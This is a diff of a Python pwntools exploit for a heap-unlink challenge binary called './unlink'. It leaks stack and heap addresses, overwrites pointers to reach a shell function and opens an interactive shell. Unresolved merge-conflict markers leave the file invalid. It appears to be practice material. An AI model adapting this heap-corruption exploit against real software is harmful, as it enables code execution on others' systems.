@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 from pwn import *
 import sys
 
@@ -60,3 +61,20 @@ if __name__ == "__main__":
     payload= b"AAAAAAAAPPPPCCCC" + heap_addr  + stack_addr + shell_addr
     sys.stdout.buffer.write(payload)
     # main()
+=======
+import re
+from pwn import *
+from struct import pack
+
+p = process("./unlink")
+
+stack_leak = int(re.search('0x[^\n]+', p.recvline().decode()).group(0),16)
+print(hex(stack_leak))
+heap_leak = int(re.search('0x[^\n]+', p.recvline().decode()).group(0),16)
+print(hex(heap_leak))
+ret = stack_leak + 16
+shell = 0x80484eb
+heap = heap_leak + 8
+p.sendline(pack('<I', shell) + b"A" * 12 + pack('<I', ret - 4) + pack('<I', heap + 4))
+p.interactive()
+>>>>>>> 1c76dcad71ac0b508686bb6e3dcd29cd5a77a8dd
